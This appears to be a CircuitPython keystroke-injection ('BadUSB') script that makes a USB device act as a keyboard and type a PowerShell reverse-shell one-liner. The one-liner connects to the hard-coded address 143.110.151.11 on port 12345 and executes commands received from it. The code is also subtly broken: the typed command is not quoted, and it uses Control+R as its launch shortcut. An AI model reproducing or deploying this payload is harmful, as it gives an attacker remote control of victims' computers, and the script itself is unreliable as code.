import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

time.sleep(1)

kbd.press(Keycode.CONTROL, Keycode.R)
kbd.release_all()
time.sleep(1)

layout.write(powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('143.110.151.11',12345);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=iex $d 2>&1;$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)}")
time.sleep(1)
kbd.press(Keycode.ENTER)
kbd.release_all()



